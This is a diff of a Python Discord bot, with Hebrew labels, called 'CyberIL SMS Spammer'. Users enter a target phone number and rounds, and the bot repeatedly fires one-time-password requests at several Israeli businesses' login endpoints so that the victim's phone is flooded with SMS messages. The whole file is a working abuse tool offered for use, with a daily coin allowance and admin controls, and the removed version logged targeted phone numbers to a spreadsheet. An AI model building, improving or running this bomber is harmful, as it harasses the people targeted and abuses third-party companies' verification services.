@@ -1,139 +1,181 @@
 import discord
 from discord import app_commands
-from discord.ext import commands
-import os
-import requests
+import aiohttp
 import asyncio
-from datetime import datetime, timedelta
+import os
+import time
+import logging
 
-TOKEN = os.getenv('DISCORD_TOKEN')
-GSHEET_URL = os.getenv('GSHEET_URL')
+# הגדרת לוגים כדי שתוכל לראות הכל ב-Railway Logs
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger('CyberIL-Spammer')
 
-# ניהול נתונים בזיכרון (בשימוש ב-Railway מומלץ לעבור ל-Database בעתיד)
-user_tokens = {} # {user_id: message_balance}
-user_cooldowns = {} # {user_id: next_claim_time}
-active_attacks = {}
+# משיכת נתונים מהגדרות המערכת
+TOKEN = os.getenv("BOT_TOKEN")
+APPLICATION_ID = os.getenv("CLIENT_ID")
 
-class CyberBot(commands.Bot):
+class SpammerBot(discord.Client):
     def __init__(self):
         intents = discord.Intents.default()
-        intents.message_content = True
-        super().__init__(command_prefix="!", intents=intents)
+        intents.members = True
+        super().__init__(intents=intents, application_id=APPLICATION_ID)
+        self.tree = app_commands.CommandTree(self)
+        
+        # מסדי נתונים בזיכרון
+        self.user_tokens = {}
+        self.user_cooldowns = {}
+        self.active_attacks = set()
 
     async def setup_hook(self):
+        logger.info("🔄 מסנכרן פקודות סלאש...")
         await self.tree.sync()
+        logger.info("✅ הפקודות מוכנות לשימוש!")
 
-bot = CyberBot()
+bot = SpammerBot()
 
-# --- פונקציות עזר לטוקנים ---
-def can_claim(user_id):
-    if user_id not in user_cooldowns: return True
-    return datetime.now() >= user_cooldowns[user_id]
+# ════════════════════════════════════════
+#   מנוע ה-API (הספאמר החזק)
+# ════════════════════════════════════════
 
-def get_balance(user_id):
-    return user_tokens.get(user_id, 0)
-
-# --- פונקציית הלוג ---
-def send_to_sheet(user_name, user_id, phone, rounds, success, failed):
-    if not GSHEET_URL: return
-    payload = {
-        "user_name": user_name, "user_id": str(user_id), "target_phone": phone,
-        "rounds": rounds, "success_count": success, "failed_count": failed
-    }
-    try: requests.post(GSHEET_URL, json=payload, timeout=10)
-    except: print("❌ GSheet Error")
-
-# --- מנוע ה-API ---
-def api_request(url, payload=None, method="POST", is_json=True):
+async def send_sms_request(session, url, method, data=None, json=None, headers=None):
     try:
-        headers = {"User-Agent": "Mozilla/5.0"}
-        if method == "GET": r = requests.get(url, headers=headers, timeout=4)
-        else:
-            if is_json: r = requests.post(url, json=payload, headers=headers, timeout=4)
-            else: r = requests.post(url, data=payload, headers=headers, timeout=4)
-        return r.status_code in [200, 201]
-    except: return False
+        async with session.request(method, url, data=data, json=json, headers=headers, timeout=5) as resp:
+            return resp.status in [200, 201, 204]
+    except Exception as e:
+        logger.error(f"Error sending to {url}: {e}")
+        return False
 
-async def fire_round(phone):
-    tasks = [
-        asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
-        asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
-        asyncio.to_thread(api_request, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}),
-        asyncio.to_thread(api_request, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
-        asyncio.to_thread(api_request, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET"),
-        asyncio.to_thread(api_request, "https://api.hopon.co.il/v0.15/1/isr/users", {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False})
-    ]
-    results = await asyncio.gather(*tasks)
-    return sum(results), len(results) - sum(results)
+async def run_bombing_round(phone):
+    """פונקציה ששולחת בבת אחת לכל האתרים"""
+    async with aiohttp.ClientSession() as session:
+        # רשימת המטרות - ה-API החזק שלנו
+        targets = [
+            {"url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": phone, "type": "phone", "projectId": "1"}},
+            {"url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "json": {"phoneNumber": phone}},
+            {"url": "https://api.dominos.co.il/sendOtp", "method": "POST", "json": {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}},
+            {"url": "https://api.hopon.co.il/v0.15/1/isr/users", "method": "POST", "json": {"clientKey": "11687CA9", "countryCode": "972", "phone": phone}},
+            {"url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "method": "POST", "data": f"phone={phone}", "headers": {'Content-Type': 'application/x-www-form-urlencoded'}},
+            {"url": "https://pizzahut.co.il/api/v1/auth/otp/send", "method": "POST", "json": {"phone": phone}},
+            {"url": "https://api.rebar.co.il/v1/auth/otp", "method": "POST", "json": {"phone": phone}}
+        ]
+        
+        tasks = [send_sms_request(session, **t) for t in targets]
+        results = await asyncio.gather(*tasks)
+        return sum(1 for r in results if r)
 
-# --- לוגיקת הרצה ---
-async def start_attack(interaction, phone, rounds):
-    uid = interaction.user.id
-    
-    # בדיקת יתרה (כל סיבוב צורך 6 הודעות מהטוקן)
-    needed = int(rounds) * 6
-    if get_balance(uid) < needed:
-        await interaction.followup.send(f"❌ אין לך מספיק הודעות בטוקן! חסר לך {needed - get_balance(uid)} הודעות.", ephemeral=True)
-        return
+# ════════════════════════════════════════
+#   ממשק המשתמש (Modals & Buttons)
+# ════════════════════════════════════════
 
-    active_attacks[uid] = True
-    total_s, total_f = 0, 0
-    
-    for i in range(int(rounds)):
-        if not active_attacks.get(uid): break
-        s, f = await fire_round(phone)
-        total_s += s
-        total_f += f
-        # עדכון יתרה בזמן אמת
-        user_tokens[uid] -= 6 
-        await asyncio.sleep(2)
-    
-    send_to_sheet(interaction.user.name, uid, phone, rounds, total_s, total_f)
-    active_attacks.pop(uid, None)
+class BombingModal(discord.ui.Modal, title="🚀 CyberIL SMS Launcher"):
+    phone = discord.ui.TextInput(
+        label="מספר טלפון יעד",
+        placeholder="05XXXXXXXX",
+        min_length=10,
+        max_length=10,
+        required=True
+    )
+    rounds = discord.ui.TextInput(
+        label="כמות סיבובים (1-20)",
+        default="5",
+        min_length=1,
+        max_length=2,
+        required=True
+    )
 
-# --- ממשק דיסקורד ---
-class AttackControl(discord.ui.View):
+    async def on_submit(self, interaction: discord.Interaction):
+        phone_num = self.phone.value
+        try:
+            num_rounds = int(self.rounds.value)
+        except ValueError:
+            num_rounds = 1
+
+        uid = interaction.user.id
+        if num_rounds > 20: num_rounds = 20
+
+        await interaction.response.send_message(f"💣 **הפצצה התחילה!**\nמטרה: `{phone_num}`\nסיבובים: `{num_rounds}`", ephemeral=True)
+        bot.active_attacks.add(uid)
+
+        for i in range(num_rounds):
+            if uid not in bot.active_attacks or bot.user_tokens.get(uid, 0) < 1:
+                break
+            
+            # ביצוע השליחה
+            await run_bombing_round(phone_num)
+            
+            # הורדת מטבע
+            bot.user_tokens[uid] -= 1
+            
+            # המתנה קצרה בין סיבובים למניעת חסימות
+            await asyncio.sleep(2.5)
+
+        if uid in bot.active_attacks:
+            bot.active_attacks.remove(uid)
+        await interaction.followup.send(f"✅ ההפצצה על {phone_num} הסתיימה.", ephemeral=True)
+
+class ControlPanelView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger)
-    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if get_balance(interaction.user.id) < 6:
-            return await interaction.response.send_message("❌ הטוקן שלך ריק! לחץ על 'קח טוקן'.", ephemeral=True)
-            
-        class BombModal(discord.ui.Modal, title="CyberIL Launcher"):
-            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
-            rounds = discord.ui.TextInput(label="סיבובים (עד 20)", default="5")
-            async def on_submit(self, modal_inter: discord.Interaction):
-                r = int(self.rounds.value)
-                if r > 20: r = 20 # הגבלה ל-120 הודעות (20*6)
-                await modal_inter.response.send_message(f"⚔️ התקיפה החלה! יתרה נוכחית: {user_tokens[interaction.user.id]}", ephemeral=True)
-                asyncio.create_task(start_attack(modal_inter, self.phone.value, r))
-        await interaction.response.send_modal(BombModal())
+    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger, custom_id="btn_start")
+    async def start_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
+        tokens = bot.user_tokens.get(interaction.user.id, 0)
+        if tokens < 5:
+            return await interaction.response.send_message("❌ אין לך מספיק מטבעות! קח טוקן יומי.", ephemeral=True)
+        await interaction.response.send_modal(BombingModal())
 
-    @discord.ui.button(label="🎫 קח טוקן (120 הודעות)", style=discord.ButtonStyle.success)
-    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="🎫 טוקן יומי (120)", style=discord.ButtonStyle.success, custom_id="btn_claim")
+    async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
-        if can_claim(uid):
-            user_tokens[uid] = get_balance(uid) + 120
-            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
-            await interaction.response.send_message(f"✅ קיבלת טוקן! היתרה שלך: {user_tokens[uid]} הודעות. תוכל לקחת שוב מחר.", ephemeral=True)
+        now = time.time()
+        last_claim = bot.user_cooldowns.get(uid, 0)
+
+        if now - last_claim < 86400:
+            remaining = int((86400 - (now - last_claim)) // 3600)
+            return await interaction.response.send_message(f"⏳ חזור בעוד {remaining} שעות.", ephemeral=True)
+
+        bot.user_tokens[uid] = bot.user_tokens.get(uid, 0) + 120
+        bot.user_cooldowns[uid] = now
+        await interaction.response.send_message("✅ קיבלת 120 מטבעות! תהנה.", ephemeral=True)
+
+    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
+    async def stop_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id in bot.active_attacks:
+            bot.active_attacks.remove(interaction.user.id)
+            await interaction.response.send_message("🛑 התקיפה שלך הופסקה.", ephemeral=True)
         else:
-            wait_time = user_cooldowns[uid] - datetime.now()
-            hours = wait_time.seconds // 3600
-            minutes = (wait_time.seconds // 60) % 60
-            await interaction.response.send_message(f"⏳ כבר לקחת טוקן. נשאר לך לחכות {hours} שעות ו-{minutes} דקות.", ephemeral=True)
+            await interaction.response.send_message("אין תקיפה פעילה כרגע.", ephemeral=True)
 
-    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
-    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        active_attacks[interaction.user.id] = False
-        await interaction.response.send_message("🚨 נעצר.", ephemeral=True)
+# ════════════════════════════════════════
+#   פקודות סלאש (/)
+# ════════════════════════════════════════
 
-@bot.tree.command(name="setup", description="לוח בקרה")
-async def setup(interaction: discord.Interaction):
-    balance = get_balance(interaction.user.id)
-    embed = discord.Embed(title="⚡ CyberIL SMS System", description=f"היתרה שלך: **{balance}** הודעות", color=0x00FF00)
-    embed.add_field(name="חוקים", value="• טוקן אחד ל-24 שעות\n• כל טוקן שווה 120 הודעות\n• מקסימום 20 סיבובים למכה", inline=False)
-    await interaction.response.send_message(embed=embed, view=AttackControl())
+@bot.tree.command(name="setup_spammer", description="פתיחת פאנל ה-SMS")
+async def setup_spammer(interaction: discord.Interaction):
+    tokens = bot.user_tokens.get(interaction.user.id, 0)
+    embed = discord.Embed(
+        title="⚡ CyberIL SMS Spammer",
+        description=f"ברוך הבא למערכת ה-SMS.\nהיתרה שלך: **{tokens}** מטבעות.",
+        color=discord.Color.from_rgb(200, 0, 0)
+    )
+    embed.add_field(name="📋 הוראות", value="1. קח טוקן יומי\n2. לחץ על התחל\n3. הכנס מספר וסיבובים")
+    embed.set_footer(text="CyberIL Team | Secure Spammer")
+    await interaction.response.send_message(embed=embed, view=ControlPanelView())
 
-bot.run(TOKEN)
+@bot.tree.command(name="give_token", description="הענקת מטבעות למשתמש")
+@app_commands.checks.has_permissions(administrator=True)
+async def give_token(interaction: discord.Interaction, user: discord.Member, amount: int):
+    bot.user_tokens[user.id] = bot.user_tokens.get(user.id, 0) + amount
+    await interaction.response.send_message(f"✅ הוספת **{amount}** מטבעות ל-{user.mention}.", ephemeral=True)
+
+@bot.event
+async def on_ready():
+    logger.info(f"🤖 הבוט באוויר: {bot.user.name}")
+    await bot.change_presence(activity=discord.Game(name="/setup_spammer"))
+
+# הפעלה
+if __name__ == "__main__":
+    if not TOKEN:
+        print("❌ שגיאה: לא נמצא BOT_TOKEN בהגדרות המערכת!")
+    else:
+        bot.run(TOKEN)
